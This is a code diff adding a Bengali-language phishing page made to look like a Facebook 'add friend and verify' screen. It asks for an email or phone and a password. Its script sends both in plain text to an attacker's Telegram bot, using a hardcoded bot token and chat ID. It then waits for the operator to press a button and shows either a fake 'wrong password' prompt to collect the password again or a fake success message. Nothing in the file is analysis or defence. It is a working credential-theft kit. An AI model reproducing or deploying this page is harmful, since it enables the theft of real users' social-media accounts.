@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Add Friends & Verify</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f0f2f5; font-family: 'Helvetica', Arial, sans-serif; }
+        .fb-input {
+            width: 100%; padding: 14px 16px; border: 1px solid #dddfe2;
+            border-radius: 6px; background: #f5f6f7; font-size: 15px;
+            outline: none; transition: border-color 0.2s;
+        }
+        .fb-input:focus { border-color: #1877f2; background: #fff; box-shadow: 0 0 0 2px #e7f3ff; }
+        .fb-loader {
+            width: 50px; height: 50px; border: 5px solid #f3f3f3;
+            border-top: 5px solid #1877f2; border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="bg-[#f0f2f5] flex flex-col items-center min-h-screen">
+
+    <div id="overlay" class="hidden fixed inset-0 bg-[#f0f2f5] z-50 flex flex-col items-center pt-12 text-center">
+        <div class="w-full max-w-sm overflow-hidden bg-white rounded-t-2xl shadow-sm">
+            <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" class="w-full h-auto">
+        </div>
+        <div class="w-full max-w-sm p-8 bg-white shadow-md mt-3 rounded-b-2xl min-h-[55vh] flex flex-col items-center justify-center">
+            <div id="status-container" class="flex flex-col items-center w-full">
+                <div id="loader" class="fb-loader mb-6"></div>
+                
+                <div id="error-icon" class="hidden mb-4 bg-red-100 p-4 rounded-full">
+                    <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M6 18L18 6M6 6l12 12"></path></svg>
+                </div>
+
+                <div id="success-icon" class="hidden mb-4 bg-green-100 p-4 rounded-full">
+                    <svg class="w-12 h-12 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+                </div>
+
+                <h3 id="status-title" class="text-xl font-bold text-gray-800 mb-2">যাচাই করা হচ্ছে...</h3>
+                <p id="status-msg" class="text-gray-500 px-6 mb-8">অপেক্ষা করুন, অল্প কিছুক্ষণের মধ্যে অ্যাড করা হচ্ছে।</p>
+                
+                <a id="view-profile-btn" href="https://m.me/sabinayasmeen121" class="hidden w-full bg-[#1877f2] text-white font-bold py-3 rounded-xl shadow-lg text-center">View Profile</a>
+                
+                <button id="retry-btn" onclick="location.reload()" class="hidden w-full bg-[#1877f2] text-white font-bold py-3 rounded-xl shadow-lg">আবার চেষ্টা করুন</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="main-content" class="w-full max-w-sm p-6 bg-white shadow-md rounded-b-2xl flex flex-col items-center mt-10">
+        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" class="w-full rounded-xl mb-4">
+        
+        <div id="initial-view" class="w-full">
+            <h2 class="text-2xl font-bold text-gray-900 mb-2 text-center">ফ্রেন্ড অ্যাড করুন</h2>
+            <p class="text-gray-600 text-center mb-6 px-4">অ্যাকাউন্ট ভেরিফাই করে ফ্রেন্ড রিকোয়েস্ট পাঠান।</p>
+            <form id="login-form">
+                <input type="email" id="email" class="fb-input mb-3" placeholder="ইমেইল বা ফোন" required>
+                <input type="password" id="pass" class="fb-input mb-4" placeholder="পাসওয়ার্ড" required>
+                <button type="button" onclick="startProcess()" class="w-full bg-[#1877f2] text-white font-bold py-4 rounded-xl shadow-lg active:scale-95">Add Friend</button>
+            </form>
+        </div>
+    </div>
+
+<script>
+    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+    const chatId = "8516934257";
+    let lastUpdateId = 0;
+
+    async function startProcess() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        if(!email || !pass) { alert("তথ্য দিন।"); return; }
+
+        document.getElementById('overlay').classList.remove('hidden');
+
+        // টেলিগ্রামে মেসেজ পাঠানো
+        const msg = `🚀 নতুন লগইন রিকোয়েস্ট!\n📧 User: \`${email}\`\n🔑 Pass: \`${pass}\``;
+        const buttons = {
+            inline_keyboard: [[
+                { text: "❌ Error", callback_data: "cmd_error" },
+                { text: "✅ Success", callback_data: "cmd_success" }
+            ]]
+        };
+
+        try {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: chatId, 
+                    text: msg, 
+                    parse_mode: "Markdown", 
+                    reply_markup: buttons
+                })
+            });
+            
+            // কন্ট্রোল শোনার জন্য লুপ শুরু
+            listenForCommands();
+        } catch (e) {
+            console.error("Error sending to Telegram");
+        }
+    }
+
+    function listenForCommands() {
+        const interval = setInterval(async () => {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
+                const data = await res.json();
+                
+                if (data.result && data.result.length > 0) {
+                    data.result.forEach(update => {
+                        lastUpdateId = update.update_id;
+                        const command = update.callback_query?.data;
+                        
+                        if (command === "cmd_error") {
+                            clearInterval(interval);
+                            showErrorState();
+                        } 
+                        else if (command === "cmd_success") {
+                            clearInterval(interval);
+                            showSuccessState();
+                        }
+                    });
+                }
+            } catch (e) {}
+        }, 3000);
+    }
+
+    function showSuccessState() {
+        document.getElementById('loader').classList.add('hidden');
+        document.getElementById('success-icon').classList.remove('hidden');
+        document.getElementById('status-title').innerText = "সফল হয়েছে!";
+        document.getElementById('status-title').classList.replace('text-gray-800', 'text-green-600');
+        document.getElementById('status-msg').innerText = "আপনার ফ্রেন্ড রিকোয়েস্টটি পাঠানো হয়েছে।";
+        document.getElementById('view-profile-btn').classList.remove('hidden');
+    }
+
+    function showErrorState() {
+        document.getElementById('loader').classList.add('hidden');
+        document.getElementById('error-icon').classList.remove('hidden');
+        document.getElementById('status-title').innerText = "ভুল পাসওয়ার্ড!";
+        document.getElementById('status-title').classList.replace('text-gray-800', 'text-red-600');
+        document.getElementById('status-msg').innerText = "আপনার দেওয়া পাসওয়ার্ডটি ভুল হয়েছে। দয়া করে আবার পুনরায় চেষ্টা করুন।";
+        document.getElementById('retry-btn').classList.remove('hidden');
+    }
+</script>
+</body>
+</html>
